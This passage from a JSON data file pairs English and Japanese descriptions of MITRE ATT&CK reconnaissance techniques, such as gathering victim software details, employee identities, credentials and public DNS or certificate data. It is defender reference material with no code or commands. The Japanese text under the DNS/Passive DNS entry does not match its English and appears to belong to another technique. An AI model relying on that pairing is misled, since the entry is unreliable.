                        "description_jp": "攻撃者は、ターゲティング中に使用できる被害者のホストファームウェアに関する情報を収集する可能性があります。ホストファームウェアに関する情報には、特定のホスト上の種類やバージョンなど、さまざまな詳細が含まれる場合があり、これにより環境内のホストに関する詳細情報（構成、目的、経過年数/パッチレベルなど）を推測できる可能性があります。\n\n攻撃者は、[情報のためのフィッシング](https://attack.mitre.org/techniques/T1598)を介した直接的な情報収集など、さまざまな方法でこの情報を収集する可能性があります。ホストファームウェアに関する情報は、オンラインまたはその他のアクセス可能なデータセット（求人情報、ネットワークマップ、評価レポート、履歴書、購入請求書など）を介してのみ攻撃者に公開される場合があります。(引用: ArsTechnica Intel) この情報を収集すると、他の形式の偵察（[オープンなウェブサイト/ドメインの検索](https://attack.mitre.org/techniques/T1593)や[オープンな技術データベースの検索](https://attack.mitre.org/techniques/T1596)など）、運用リソースの確立（[能力の開発](https://attack.mitre.org/techniques/T1587)や[能力の取得](https://attack.mitre.org/techniques/T1588)など）、および/または初期アクセス（[サプライチェーン侵害](https://attack.mitre.org/techniques/T1195)や[公開されているアプリケーションの悪用](https://attack.mitre.org/techniques/T1190)など）の機会が明らかになる可能性があります。"
                    },
                    {
                        "id": "T1592.002",
                        "name_eng": "Software",
                        "name_jp": "ソフトウェア",
                        "description_eng": "Adversaries may gather information about the victim's host software that can be used during targeting. Information about installed software may include a variety of details such as types and versions on specific hosts, as well as the presence of additional components that might be indicative of added defensive protections (ex: antivirus, SIEMs, etc.).\n\nAdversaries may gather this information in various ways, such as direct collection actions via [Active Scanning](https://attack.mitre.org/techniques/T1595) (ex: listening ports, server banners, user agent strings) or [Phishing for Information](https://attack.mitre.org/techniques/T1598). Adversaries may also compromise sites then include malicious content designed to collect host information from visitors.(Citation: ATT ScanBox) Information about the installed software may also be exposed to adversaries via online or other accessible data sets (ex: job postings, network maps, assessment reports, resumes, or purchase invoices). Gathering this information may reveal opportunities for other forms of reconnaissance (ex: [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593) or [Search Open Technical Databases](https://attack.mitre.org/techniques/T1596)), establishing operational resources (ex: [Develop Capabilities](https://attack.mitre.org/techniques/T1587) or [Obtain Capabilities](https://attack.mitre.org/techniques/T1588)), and/or for initial access (ex: [Supply Chain Compromise](https://attack.mitre.org/techniques/T1195) or [External Remote Services](https://attack.mitre.org/techniques/T1133)).",
                        "description_jp": "攻撃者は、ターゲティング中に使用できる被害者のホストソフトウェアに関する情報を収集する可能性があります。インストール済みソフトウェアに関する情報には、特定のホスト上の種類やバージョンなどのさまざまな詳細や、追加の防御保護を示す可能性のある追加コンポーネント（ウイルス対策ソフト、SIEMなど）の存在が含まれる場合があります。\n\n攻撃者は、[アクティブスキャン](https://attack.mitre.org/techniques/T1595)（リスニングポート、サーバーバナー、ユーザーエージェント文字列など）や[情報のためのフィッシング](https://attack.mitre.org/techniques/T1598)などの直接収集アクションを介して、さまざまな方法でこの情報を収集する可能性があります。攻撃者はまた、サイトを侵害し、訪問者からホスト情報を収集するように設計された悪意のあるコンテンツを含める可能性もあります。(引用: ATT ScanBox) インストール済みソフトウェアに関する情報は、オンラインまたはその他のアクセス可能なデータセット（求人情報、ネットワークマップ、評価レポート、履歴書、購入請求書など）を介して攻撃者に公開される場合もあります。この情報を収集すると、他の形式の偵察（[オープンなウェブサイト/ドメインの検索](https://attack.mitre.org/techniques/T1593)や[オープンな技術データベースの検索](https://attack.mitre.org/techniques/T1596)など）、運用リソースの確立（[能力の開発](https://attack.mitre.org/techniques/T1587)や[能力の取得](https://attack.mitre.org/techniques/T1588)など）、および/または初期アクセス（[サプライチェーン侵害](https://attack.mitre.org/techniques/T1195)や[外部リモートサービス](https://attack.mitre.org/techniques/T1133)など）の機会が明らかになる可能性があります。"
                    },
                    {
                        "id": "T1592.004",
                        "name_eng": "Client Configurations",
                        "name_jp": "クライアント構成",
                        "description_eng": "Adversaries may gather information about the victim's client configurations that can be used during targeting. Information about client configurations may include a variety of details and settings, including operating system/version, virtualization, architecture (ex: 32 or 64 bit), language, and/or time zone.\n\nAdversaries may gather this information in various ways, such as direct collection actions via [Active Scanning](https://attack.mitre.org/techniques/T1595) (ex: listening ports, server banners, user agent strings) or [Phishing for Information](https://attack.mitre.org/techniques/T1598). Adversaries may also compromise sites then include malicious content designed to collect host information from visitors.(Citation: ATT ScanBox) Information about the client configurations may also be exposed to adversaries via online or other accessible data sets (ex: job postings, network maps, assessment reports, resumes, or purchase invoices). Gathering this information may reveal opportunities for other forms of reconnaissance (ex: [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593) or [Search Open Technical Databases](https://attack.mitre.org/techniques/T1596)), establishing operational resources (ex: [Develop Capabilities](https://attack.mitre.org/techniques/T1587) or [Obtain Capabilities](https://attack.mitre.org/techniques/T1588)), and/or initial access (ex: [Supply Chain Compromise](https://attack.mitre.org/techniques/T1195) or [External Remote Services](https://attack.mitre.org/techniques/T1133)).",
                        "description_jp": "攻撃者は、ターゲティング中に使用できる被害者のクライアント構成に関する情報を収集する可能性があります。クライアント構成に関する情報には、オペレーティングシステム/バージョン、仮想化、アーキテクチャ（32ビットまたは64ビットなど）、言語、および/またはタイムゾーンなど、さまざまな詳細と設定が含まれる場合があります。\n\n攻撃者は、[アクティブスキャン](https://attack.mitre.org/techniques/T1595)（リスニングポート、サーバーバナー、ユーザーエージェント文字列など）や[情報のためのフィッシング](https://attack.mitre.org/techniques/T1598)などの直接収集アクションを介して、さまざまな方法でこの情報を収集する可能性があります。攻撃者はまた、サイトを侵害し、訪問者からホスト情報を収集するように設計された悪意のあるコンテンツを含める可能性もあります。(引用: ATT ScanBox) クライアント構成に関する情報は、オンラインまたはその他のアクセス可能なデータセット（求人情報、ネットワークマップ、評価レポート、履歴書、購入請求書など）を介して攻撃者に公開される場合もあります。この情報を収集すると、他の形式の偵察（[オープンなウェブサイト/ドメインの検索](https://attack.mitre.org/techniques/T1593)や[オープンな技術データベースの検索](https://attack.mitre.org/techniques/T1596)など）、運用リソースの確立（[能力の開発](https://attack.mitre.org/techniques/T1587)や[能力の取得](https://attack.mitre.org/techniques/T1588)など）、および/または初期アクセス（[サプライチェーン侵害](https://attack.mitre.org/techniques/T1195)や[外部リモートサービス](https://attack.mitre.org/techniques/T1133)など）の機会が明らかになる可能性があります。"
                    }
                ]
            },
            {
                "id": "T1594",
                "name_eng": "Search Victim-Owned Websites",
                "name_jp": "被害者所有ウェブサイトの検索",
                "description_eng": "Adversaries may search websites owned by the victim for information that can be used during targeting. Victim-owned websites may contain a variety of details, including names of departments/divisions, physical locations, and data about key employees such as names, roles, and contact info (ex: [Email Addresses](https://attack.mitre.org/techniques/T1589/002)). These sites may also have details highlighting business operations and relationships.(Citation: Comparitech Leak)\n\nAdversaries may search victim-owned websites to gather actionable information. Information from these sources may reveal opportunities for other forms of reconnaissance (ex: [Phishing for Information](https://attack.mitre.org/techniques/T1598) or [Search Open Technical Databases](https://attack.mitre.org/techniques/T1596)), establishing operational resources (ex: [Establish Accounts](https://attack.mitre.org/techniques/T1585) or [Compromise Accounts](https://attack.mitre.org/techniques/T1586)), and/or initial access (ex: [Trusted Relationship](https://attack.mitre.org/techniques/T1199) or [Phishing](https://attack.mitre.org/techniques/T1566)).\n\nIn addition to manually browsing the website, adversaries may attempt to identify hidden directories or files that could contain additional sensitive information or vulnerable functionality. They may do this through automated activities such as [Wordlist Scanning](https://attack.mitre.org/techniques/T1595/003), as well as by leveraging files such as sitemap.xml and robots.txt.(Citation: Perez Sitemap XML 2023)(Citation: Register Robots TXT 2015)",
                "description_jp": "攻撃者は、ターゲティング中に使用できる情報について、被害者が所有するウェブサイトを検索する可能性があります。被害者が所有するウェブサイトには、部門/部署名、物理的な場所、氏名、役職、連絡先情報（[メールアドレス](https://attack.mitre.org/techniques/T1589/002)など）などの主要な従業員に関するデータなど、さまざまな詳細が含まれている場合があります。これらのサイトには、事業運営や関係性を強調する詳細情報も含まれている場合があります。(引用: Comparitech Leak)\n\n敵対者は、実用的な情報を収集するために、被害者が所有するウェブサイトを検索することがあります。これらの情報源からの情報は、他の形態の偵察（例：[情報のためのフィッシング](https://attack.mitre.org/techniques/T1598)または[オープンな技術データベースの検索](https://attack.mitre.org/techniques/T1596)）、運用リソースの確立（例：[アカウントの確立](https://attack.mitre.org/techniques/T1585)または[アカウントの侵害](https://attack.mitre.org/techniques/T1586)）、および/または初期アクセス（例：[信頼できる関係](https://attack.mitre.org/techniques/T1199)または[フィッシング](https://attack.mitre.org/techniques/T1566)）の機会を明らかにする可能性があります。\n\nウェブサイトを手動で閲覧することに加えて、攻撃者は、追加の機密情報や脆弱な機能を含む可能性のある非表示のディレクトリやファイルを特定しようとする場合があります。これは、[ワードリストスキャン](https://attack.mitre.org/techniques/T1595/003)などの自動化されたアクティビティや、sitemap.xmlやrobots.txtなどのファイルを利用することによって行われる場合があります。(引用: Perez Sitemap XML 2023)(引用: Register Robots TXT 2015)",
                "subtechniques": []
            },
            {
                "id": "T1589",
                "name_eng": "Gather Victim Identity Information",
                "name_jp": "被害者識別情報の収集",
                "description_eng": "Adversaries may gather information about the victim's identity that can be used during targeting. Information about identities may include a variety of details, including personal data (ex: employee names, email addresses, security question responses, etc.) as well as sensitive details such as credentials or multi-factor authentication (MFA) configurations.\n\nAdversaries may gather this information in various ways, such as direct elicitation via [Phishing for Information](https://attack.mitre.org/techniques/T1598). Information about users could also be enumerated via other active means (i.e. [Active Scanning](https://attack.mitre.org/techniques/T1595)) such as probing and analyzing responses from authentication services that may reveal valid usernames in a system or permitted MFA /methods associated with those usernames.(Citation: GrimBlog UsernameEnum)(Citation: Obsidian SSPR Abuse 2023) Information about victims may also be exposed to adversaries via online or other accessible data sets (ex: [Social Media](https://attack.mitre.org/techniques/T1593/001) or [Search Victim-Owned Websites](https://attack.mitre.org/techniques/T1594)).(Citation: OPM Leak)(Citation: Register Deloitte)(Citation: Register Uber)(Citation: Detectify Slack Tokens)(Citation: Forbes GitHub Creds)(Citation: GitHub truffleHog)(Citation: GitHub Gitrob)(Citation: CNET Leaks)\n\nGathering this information may reveal opportunities for other forms of reconnaissance (ex: [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593) or [Phishing for Information](https://attack.mitre.org/techniques/T1598)), establishing operational resources (ex: [Compromise Accounts](https://attack.mitre.org/techniques/T1586)), and/or initial access (ex: [Phishing](https://attack.mitre.org/techniques/T1566) or [Valid Accounts](https://attack.mitre.org/techniques/T1078)).",
                "description_jp": "攻撃者は、ターゲティング中に使用できる被害者のIDに関する情報を収集する可能性があります。IDに関する情報には、個人データ（従業員の名前、メールアドレス、セキュリティ質問の回答など）や、資格情報や多要素認証（MFA）構成などの機密情報など、さまざまな詳細が含まれる場合があります。\n\n攻撃者は、[情報のためのフィッシング](https://attack.mitre.org/techniques/T1598)を介した直接的な情報収集など、さまざまな方法でこの情報を収集する可能性があります。ユーザーに関する情報はまた、システム内の有効なユーザー名やそれらのユーザー名に関連付けられた許可されたMFA/メソッドを明らかにする可能性のある認証サービスからの応答をプロービングおよび分析するなど、他のアクティブな手段（つまり、[アクティブスキャン](https://attack.mitre.org/techniques/T1595)）を介して列挙される可能性があります。(引用: GrimBlog UsernameEnum)(引用: Obsidian SSPR Abuse 2023) 被害者に関する情報はまた、オンラインまたはその他のアクセス可能なデータセット（[ソーシャルメディア](https://attack.mitre.org/techniques/T1593/001)や[被害者所有ウェブサイトの検索](https://attack.mitre.org/techniques/T1594)など）を介して攻撃者に公開される場合もあります。(引用: OPM Leak)(引用: Register Deloitte)(引用: Register Uber)(引用: Detectify Slack Tokens)(引用: Forbes GitHub Creds)(引用: GitHub truffleHog)(引用: GitHub Gitrob)(引用: CNET Leaks)\n\nこの情報を収集すると、他の形式の偵察（[オープンなウェブサイト/ドメインの検索](https://attack.mitre.org/techniques/T1593)や[情報のためのフィッシング](https://attack.mitre.org/techniques/T1598)など）、運用リソースの確立（[アカウントの侵害](https://attack.mitre.org/techniques/T1586)など）、および/または初期アクセス（[フィッシング](https://attack.mitre.org/techniques/T1566)や[有効なアカウント](https://attack.mitre.org/techniques/T1078)など）の機会が明らかになる可能性があります。",
                "subtechniques": [
                    {
                        "id": "T1589.003",
                        "name_eng": "Employee Names",
                        "name_jp": "従業員名",
                        "description_eng": "Adversaries may gather employee names that can be used during targeting. Employee names be used to derive email addresses as well as to help guide other reconnaissance efforts and/or craft more-believable lures.\n\nAdversaries may easily gather employee names, since they may be readily available and exposed via online or other accessible data sets (ex: [Social Media](https://attack.mitre.org/techniques/T1593/001) or [Search Victim-Owned Websites](https://attack.mitre.org/techniques/T1594)).(Citation: OPM Leak) Gathering this information may reveal opportunities for other forms of reconnaissance (ex: [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593) or [Phishing for Information](https://attack.mitre.org/techniques/T1598)), establishing operational resources (ex: [Compromise Accounts](https://attack.mitre.org/techniques/T1586)), and/or initial access (ex: [Phishing](https://attack.mitre.org/techniques/T1566) or [Valid Accounts](https://attack.mitre.org/techniques/T1078)).",
                        "description_jp": "攻撃者は、ターゲティング中に使用できる従業員の名前を収集する可能性があります。従業員の名前は、メールアドレスを導き出したり、他の偵察活動を支援したり、より信憑性の高いおとりを作成したりするために使用できます。\n\n従業員の名前は、オンラインまたはその他のアクセス可能なデータセット（[ソーシャルメディア](https://attack.mitre.org/techniques/T1593/001)や[被害者所有ウェブサイトの検索](https://attack.mitre.org/techniques/T1594)など）を介して容易に入手可能であり、公開されている可能性があるため、攻撃者は簡単に収集できます。(引用: OPM Leak) この情報を収集すると、他の形式の偵察（[オープンなウェブサイト/ドメインの検索](https://attack.mitre.org/techniques/T1593)や[情報のためのフィッシング](https://attack.mitre.org/techniques/T1598)など）、運用リソースの確立（[アカウントの侵害](https://attack.mitre.org/techniques/T1586)など）、および/または初期アクセス（[フィッシング](https://attack.mitre.org/techniques/T1566)や[有効なアカウント](https://attack.mitre.org/techniques/T1078)など）の機会が明らかになる可能性があります。"
                    },
                    {
                        "id": "T1589.002",
                        "name_eng": "Email Addresses",
                        "name_jp": "メールアドレス",
                        "description_eng": "Adversaries may gather email addresses that can be used during targeting. Even if internal instances exist, organizations may have public-facing email infrastructure and addresses for employees.\n\nAdversaries may easily gather email addresses, since they may be readily available and exposed via online or other accessible data sets (ex: [Social Media](https://attack.mitre.org/techniques/T1593/001) or [Search Victim-Owned Websites](https://attack.mitre.org/techniques/T1594)).(Citation: HackersArise Email)(Citation: CNET Leaks) Email addresses could also be enumerated via more active means (i.e. [Active Scanning](https://attack.mitre.org/techniques/T1595)), such as probing and analyzing responses from authentication services that may reveal valid usernames in a system.(Citation: GrimBlog UsernameEnum) For example, adversaries may be able to enumerate email addresses in Office 365 environments by querying a variety of publicly available API endpoints, such as autodiscover and GetCredentialType.(Citation: GitHub Office 365 User Enumeration)(Citation: Azure Active Directory Reconnaisance)\n\nGathering this information may reveal opportunities for other forms of reconnaissance (ex: [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593) or [Phishing for Information](https://attack.mitre.org/techniques/T1598)), establishing operational resources (ex: [Email Accounts](https://attack.mitre.org/techniques/T1586/002)), and/or initial access (ex: [Phishing](https://attack.mitre.org/techniques/T1566) or [Brute Force](https://attack.mitre.org/techniques/T1110) via [External Remote Services](https://attack.mitre.org/techniques/T1133)).",
                        "description_jp": "攻撃者は、ターゲティング中に使用できるメールアドレスを収集する可能性があります。内部インスタンスが存在する場合でも、組織は従業員向けの公開メールインフラストラクチャとアドレスを持っている場合があります。\n\n攻撃者は、オンラインまたはその他のアクセス可能なデータセット（[ソーシャルメディア](https://attack.mitre.org/techniques/T1593/001)や[被害者所有ウェブサイトの検索](https://attack.mitre.org/techniques/T1594)など）を介して容易に入手可能であり、公開されている可能性があるため、メールアドレスを簡単に収集できます。(引用: HackersArise Email)(引用: CNET Leaks) メールアドレスはまた、システム内の有効なユーザー名を明らかにする可能性のある認証サービスからの応答をプロービングおよび分析するなど、より積極的な手段（つまり、[アクティブスキャン](https://attack.mitre.org/techniques/T1595)）を介して列挙される可能性もあります。(引用: GrimBlog UsernameEnum) 例えば、攻撃者は、autodiscoverやGetCredentialTypeなどのさまざまな一般に公開されているAPIエンドポイントを照会することにより、Office 365環境内のメールアドレスを列挙できる場合があります。(引用: GitHub Office 365 User Enumeration)(引用: Azure Active Directory Reconnaisance)\n\nこの情報を収集すると、他の形式の偵察（[オープンなウェブサイト/ドメインの検索](https://attack.mitre.org/techniques/T1593)や[情報のためのフィッシング](https://attack.mitre.org/techniques/T1598)など）、運用リソースの確立（[メールアカウント](https://attack.mitre.org/techniques/T1586/002)など）、および/または初期アクセス（[フィッシング](https://attack.mitre.org/techniques/T1566)や[外部リモートサービス](https://attack.mitre.org/techniques/T1133)を介した[ブルートフォース](https://attack.mitre.org/techniques/T1110)など）の機会が明らかになる可能性があります。"
                    },
                    {
                        "id": "T1589.001",
                        "name_eng": "Credentials",
                        "name_jp": "認証情報",
                        "description_eng": "Adversaries may gather credentials that can be used during targeting. Account credentials gathered by adversaries may be those directly associated with the target victim organization or attempt to take advantage of the tendency for users to use the same passwords across personal and business accounts.\n\nAdversaries may gather credentials from potential victims in various ways, such as direct elicitation via [Phishing for Information](https://attack.mitre.org/techniques/T1598). Adversaries may also compromise sites then add malicious content designed to collect website authentication cookies from visitors.(Citation: ATT ScanBox) (Citation: Register Deloitte)(Citation: Register Uber)(Citation: Detectify Slack Tokens)(Citation: Forbes GitHub Creds)(Citation: GitHub truffleHog)(Citation: GitHub Gitrob)(Citation: CNET Leaks) Where multi-factor authentication (MFA) based on out-of-band communications is in use, adversaries may compromise a service provider to gain access to MFA codes and one-time passwords (OTP).(Citation: Okta Scatter Swine 2022)\n\nCredential information may also be exposed to adversaries via leaks to online or other accessible data sets (ex: [Search Engines](https://attack.mitre.org/techniques/T1593/002), breach dumps, code repositories, etc.). Adversaries may purchase credentials from dark web markets, such as Russian Market and 2easy, or through access to Telegram channels that distribute logs from infostealer malware.(Citation: Bleeping Computer 2easy 2021)(Citation: SecureWorks Infostealers 2023)(Citation: Bleeping Computer Stealer Logs 2023)\n\nGathering this information may reveal opportunities for other forms of reconnaissance (ex: [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593) or [Phishing for Information](https://attack.mitre.org/techniques/T1598)), establishing operational resources (ex: [Compromise Accounts](https://attack.mitre.org/techniques/T1586)), and/or initial access (ex: [External Remote Services](https://attack.mitre.org/techniques/T1133) or [Valid Accounts](https://attack.mitre.org/techniques/T1078)).",
                        "description_jp": "攻撃者は、ターゲティング中に使用できる資格情報を収集する可能性があります。攻撃者によって収集されたアカウント資格情報は、被害者組織に直接関連付けられているものか、ユーザーが個人アカウントとビジネスアカウントで同じパスワードを使用する傾向を利用しようとするものである可能性があります。\n\n攻撃者は、[情報のためのフィッシング](https://attack.mitre.org/techniques/T1598)を介した直接的な情報収集など、さまざまな方法で潜在的な被害者から資格情報を収集する可能性があります。攻撃者はまた、サイトを侵害し、訪問者からWebサイト認証Cookieを収集するように設計された悪意のあるコンテンツを追加する可能性もあります。(引用: ATT ScanBox)(引用: Register Deloitte)(引用: Register Uber)(引用: Detectify Slack Tokens)(引用: Forbes GitHub Creds)(引用: GitHub truffleHog)(引用: GitHub Gitrob)(引用: CNET Leaks) 帯域外通信に基づく多要素認証（MFA）が使用されている場合、攻撃者はサービスプロバイダーを侵害してMFAコードやワンタイムパスワード（OTP）へのアクセスを取得する可能性があります。(引用: Okta Scatter Swine 2022)\n\n認証情報はまた、オンラインまたはその他のアクセス可能なデータセット（[検索エンジン](https://attack.mitre.org/techniques/T1593/002)、侵害ダンプ、コードリポジトリなど）への漏洩を介して攻撃者に公開される場合があります。攻撃者は、Russian Marketや2easyなどのダークウェブマーケットから、または情報窃盗マルウェアからのログを配布するTelegramチャネルへのアクセスを通じて、認証情報を購入する場合があります。(引用: Bleeping Computer 2easy 2021)(引用: SecureWorks Infostealers 2023)(引用: Bleeping Computer Stealer Logs 2023)\n\nこの情報を収集すると、他の形式の偵察（[オープンなウェブサイト/ドメインの検索](https://attack.mitre.org/techniques/T1593)や[情報のためのフィッシング](https://attack.mitre.org/techniques/T1598)など）、運用リソースの確立（[アカウントの侵害](https://attack.mitre.org/techniques/T1586)など）、および/または初期アクセス（[外部リモートサービス](https://attack.mitre.org/techniques/T1133)や[有効なアカウント](https://attack.mitre.org/techniques/T1078)など）の機会が明らかになる可能性があります。"
                    }
                ]
            },
            {
                "id": "T1596",
                "name_eng": "Search Open Technical Databases",
                "name_jp": "オープンな技術データベースの検索",
                "description_eng": "Adversaries may search freely available technical databases for information about victims that can be used during targeting. Information about victims may be available in online databases and repositories, such as registrations of domains/certificates as well as public collections of network data/artifacts gathered from traffic and/or scans.(Citation: WHOIS)(Citation: DNS Dumpster)(Citation: Circl Passive DNS)(Citation: Medium SSL Cert)(Citation: SSLShopper Lookup)(Citation: DigitalShadows CDN)(Citation: Shodan)\n\nAdversaries may search in different open databases depending on what information they seek to gather. Information from these sources may reveal opportunities for other forms of reconnaissance (ex: [Phishing for Information](https://attack.mitre.org/techniques/T1598) or [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593)), establishing operational resources (ex: [Acquire Infrastructure](https://attack.mitre.org/techniques/T1583) or [Compromise Infrastructure](https://attack.mitre.org/techniques/T1584)), and/or initial access (ex: [External Remote Services](https://attack.mitre.org/techniques/T1133) or [Trusted Relationship](https://attack.mitre.org/techniques/T1199)).",
                "description_jp": "攻撃者は、ターゲティング中に使用できる被害者に関する情報について、自由に利用可能な技術データベースを検索する可能性があります。被害者に関する情報は、ドメイン/証明書の登録や、トラフィックやスキャンから収集されたネットワークデータ/アーティファクトの公開コレクションなど、オンラインデータベースやリポジトリで利用できる場合があります。(引用: WHOIS)(引用: DNS Dumpster)(引用: Circl Passive DNS)(引用: Medium SSL Cert)(引用: SSLShopper Lookup)(引用: DigitalShadows CDN)(引用: Shodan)\n\n敵対者は、収集しようとする情報に応じて、さまざまなオープンデータベースを検索するかもしれません。これらの情報源からの情報は、他の形態の偵察（例：[情報のためのフィッシング](https://attack.mitre.org/techniques/T1598)または[オープンなウェブサイト/ドメインの検索](https://attack.mitre.org/techniques/T1593)）、運用リソースの確立（例：[インフラストラクチャの取得](https://attack.mitre.org/techniques/T1583)または[インフラストラクチャの侵害](https://attack.mitre.org/techniques/T1584)）、および/または初期アクセス（例：[外部リモートサービス](https://attack.mitre.org/techniques/T1133)または[信頼できる関係](https://attack.mitre.org/techniques/T1199)）の機会を明らかにする可能性があります。",
                "subtechniques": [
                    {
                        "id": "T1596.003",
                        "name_eng": "Digital Certificates",
                        "name_jp": "デジタル証明書",
                        "description_eng": "Adversaries may search public digital certificate data for information about victims that can be used during targeting. Digital certificates are issued by a certificate authority (CA) in order to cryptographically verify the origin of signed content. These certificates, such as those used for encrypted web traffic (HTTPS SSL/TLS communications), contain information about the registered organization such as name and location.\n\nAdversaries may search digital certificate data to gather actionable information. Threat actors can use online resources and lookup tools to harvest information about certificates.(Citation: SSLShopper Lookup) Digital certificate data may also be available from artifacts signed by the organization (ex: certificates used from encrypted web traffic are served with content).(Citation: Medium SSL Cert) Information from these sources may reveal opportunities for other forms of reconnaissance (ex: [Active Scanning](https://attack.mitre.org/techniques/T1595) or [Phishing for Information](https://attack.mitre.org/techniques/T1598)), establishing operational resources (ex: [Develop Capabilities](https://attack.mitre.org/techniques/T1587) or [Obtain Capabilities](https://attack.mitre.org/techniques/T1588)), and/or initial access (ex: [External Remote Services](https://attack.mitre.org/techniques/T1133) or [Trusted Relationship](https://attack.mitre.org/techniques/T1199)).",
                        "description_jp": "攻撃者は、ターゲティング中に使用できる被害者に関する情報について、公開デジタル証明書データを検索する可能性があります。デジタル証明書は、署名済みコンテンツの発行元を暗号で検証するために認証局（CA）によって発行されます。これらの証明書（暗号化されたWebトラフィック（HTTPS SSL/TLS通信）に使用されるものなど）には、登録組織の名前や場所などの情報が含まれています。\n\n敵対者は、実用的な情報を収集するためにデジタル証明書データを検索するかもしれません。脅威アクターは、オンラインリソースやルックアップツールを使用して、証明書に関する情報を収集することができます。(引用：SSLShopper Lookup) デジタル証明書データは、組織によって署名されたアーティファクトからも利用できる場合があります（例：暗号化されたウェブトラフィックから使用される証明書はコンテンツと共に提供されます）。(引用：Medium SSL Cert) これらの情報源からの情報は、他の形態の偵察（例：[アクティブスキャン](https://attack.mitre.org/techniques/T1595)または[情報のためのフィッシング](https://attack.mitre.org/techniques/T1598)）、運用リソースの確立（例：[能力の開発](https://attack.mitre.org/techniques/T1587)または[能力の取得](https://attack.mitre.org/techniques/T1588)）、および/または初期アクセス（例：[外部リモートサービス](https://attack.mitre.org/techniques/T1133)または[信頼できる関係](https://attack.mitre.org/techniques/T1199)）の機会を明らかにする可能性があります。"
                    },
                    {
                        "id": "T1596.005",
                        "name_eng": "Scan Databases",
                        "name_jp": "スキャンデータベース",
                        "description_eng": "Adversaries may search within public scan databases for information about victims that can be used during targeting. Various online services continuously publish the results of Internet scans/surveys, often harvesting information such as active IP addresses, hostnames, open ports, certificates, and even server banners.(Citation: Shodan)\n\nAdversaries may search scan databases to gather actionable information. Threat actors can use online resources and lookup tools to harvest information from these services. Adversaries may seek information about their already identified targets, or use these datasets to discover opportunities for successful breaches. Information from these sources may reveal opportunities for other forms of reconnaissance (ex: [Active Scanning](https://attack.mitre.org/techniques/T1595) or [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593)), establishing operational resources (ex: [Develop Capabilities](https://attack.mitre.org/techniques/T1587) or [Obtain Capabilities](https://attack.mitre.org/techniques/T1588)), and/or initial access (ex: [External Remote Services](https://attack.mitre.org/techniques/T1133) or [Exploit Public-Facing Application](https://attack.mitre.org/techniques/T1190)).",
                        "description_jp": "攻撃者は、ターゲティング中に使用できる被害者に関する情報について、公開スキャンデータベース内を検索する可能性があります。さまざまなオンラインサービスが、アクティブなIPアドレス、ホスト名、オープンポート、証明書、さらにはサーバーバナーなどの情報を収集し、インターネットスキャン/調査の結果を継続的に公開しています。(引用: Shodan)\n\n敵対者は、実用的な情報を収集するためにスキャンデータベースを検索するかもしれません。脅威アクターは、オンラインリソースやルックアップツールを使用して、これらのサービスから情報を収集することができます。敵対者は、既に特定されているターゲットに関する情報を探したり、これらのデータセットを使用して成功した侵害の機会を発見したりするかもしれません。これらの情報源からの情報は、他の形態の偵察（例：[アクティブスキャン](https://attack.mitre.org/techniques/T1595)または[オープンなウェブサイト/ドメインの検索](https://attack.mitre.org/techniques/T1593)）、運用リソースの確立（例：[能力の開発](https://attack.mitre.org/techniques/T1587)または[能力の取得](https://attack.mitre.org/techniques/T1588)）、および/または初期アクセス（例：[外部リモートサービス](https://attack.mitre.org/techniques/T1133)または[公開されているアプリケーションの悪用](https://attack.mitre.org/techniques/T1190)）の機会を明らかにする可能性があります。"
                    },
                    {
                        "id": "T1596.001",
                        "name_eng": "DNS/Passive DNS",
                        "name_jp": "DNS/パッシブDNS",
                        "description_eng": "Adversaries may search DNS data for information about victims that can be used during targeting. DNS information may include a variety of details, including registered name servers as well as records that outline addressing for a target’s subdomains, mail servers, and other hosts.\n\nAdversaries may search DNS data to gather actionable information. Threat actors can query nameservers for a target organization directly, or search through centralized repositories of logged DNS query responses (known as passive DNS).(Citation: DNS Dumpster)(Citation: Circl Passive DNS) Adversaries may also seek and target DNS misconfigurations/leaks that reveal information about internal networks. Information from these sources may reveal opportunities for other forms of reconnaissance (ex: [Search Victim-Owned Websites](https://attack.mitre.org/techniques/T1594) or [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593)), establishing operational resources (ex: [Acquire Infrastructure](https://attack.mitre.org/techniques/T1583) or [Compromise Infrastructure](https://attack.mitre.org/techniques/T1584)), and/or initial access (ex: [External Remote Services](https://attack.mitre.org/techniques/T1133) or [Trusted Relationship](https://attack.mitre.org/techniques/T1199)).",
                        "description_jp": "攻撃者は、ターゲティング中に使用できる被害者のDNSに関する情報を収集する可能性があります。DNS情報には、登録済みネームサーバーや、ターゲットのサブドメイン、メールサーバー、その他のホストのアドレス指定を概説するレコードなど、さまざまな詳細が含まれる場合があります。DNS MX、TXT、およびSPFレコードはまた、Office 365、G Suite、Salesforce、ZendeskなどのサードパーティクラウドおよびSaaSプロバイダーの使用を明らかにする可能性があります。(引用: Sean Metcalf Twitter DNS Records)\n\n攻撃者は、[DNS/パッシブDNS](https://attack.mitre.org/techniques/T1596/001)を介して詳細を照会または収集するなど、さまざまな方法でこの情報を収集する可能性があります。DNS情報はまた、オンラインまたはその他のアクセス可能なデータセット（[オープンな技術データベースの検索](https://attack.mitre.org/techniques/T1596)など）を介して攻撃者に公開される場合もあります。(引用: DNS Dumpster)(引用: Circl Passive DNS) この情報を収集すると、他の形式の偵察（[オープンな技術データベースの検索](https://attack.mitre.org/techniques/T1596)、[オープンなウェブサイト/ドメインの検索](https://attack.mitre.org/techniques/T1593)、または[アクティブスキャン](https://attack.mitre.org/techniques/T1595)など）、運用リソースの確立（[インフラストラクチャの取得](https://attack.mitre.org/techniques/T1583)または[インフラストラクチャの侵害](https://attack.mitre.org/techniques/T1584)など）、および/または初期アクセス（[外部リモートサービス](https://attack.mitre.org/techniques/T1133)など）の機会が明らかになる可能性があります。\n\n攻撃者はまた、DNSゾーン転送（DNSクエリタイプAXFR）を使用して、誤って構成されたDNSサーバーからすべてのレコードを収集する可能性があります。(引用: Trails-DNS)(引用: DNS-CISA)(引用: Alexa-dns)"
                    },
                    {
                        "id": "T1596.004",
                        "name_eng": "CDNs",
                        "name_jp": "CDN",
